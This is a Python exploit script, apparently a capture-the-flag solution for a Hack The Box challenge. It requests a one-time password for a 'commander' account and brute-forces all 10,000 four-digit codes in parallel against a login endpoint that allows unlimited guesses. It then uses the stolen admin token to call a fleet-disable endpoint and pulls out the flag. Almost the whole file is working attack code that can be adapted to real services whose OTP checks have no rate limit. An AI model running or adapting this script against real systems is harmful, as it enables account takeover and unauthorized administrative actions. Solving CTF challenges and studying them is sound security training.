#!/usr/bin/env python3
import json
import re
import sys
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

# The OTP is 4 digits, valid for 5 minutes, and there is no limit on wrong
# guesses. Common usernames (admin, operator, commander) all have OTPs. The
# commander account has the admin role, which disable needs. The loop stops at
# the first response that is not "Invalid OTP.".

THREADS = 32


def post(url, body, cookie=None):
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, data=json.dumps(body).encode(), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode(), resp.headers
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode(), err.headers
    except Exception as err:
        return -1, str(err), None


def brute_otp(base, username):
    def guess(i):
        return i, post(f"{base}/api/auth/loginOtp", {"username": username, "otp": f"{i:04d}"})

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(guess, i) for i in range(10000)]
        for fut in as_completed(futures):
            i, (code, body, _) = fut.result()
            if code == -1 or '"Invalid OTP."' in body:
                continue
            if code != 200:
                raise RuntimeError(f"unexpected response for OTP {i:04d}: {code} {body[:200]}")
            for f in futures:
                f.cancel()
            return i, body
    raise RuntimeError("no OTP matched")


def exploit(host, port):
    base = f"http://{host}:{port}"

    status, body, _ = post(f"{base}/api/auth/requestOtp", {"username": "commander"})
    if status != 200:
        raise RuntimeError(f"requestOtp failed: {status} {body[:200]}")
    print("[*] OTP requested for commander")

    otp, body = brute_otp(base, "commander")
    token = json.loads(body)["access_token"]
    print(f"[+] OTP {otp:04d} accepted, admin token obtained")

    status, body, _ = post(f"{base}/api/fleet/disable", {}, cookie=f"access_token={token}")
    flag = re.search(r"HTB\{[^}]*\}", body)
    if not flag:
        raise RuntimeError(f"flag not found in disable response: {status} {body[:200]}")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
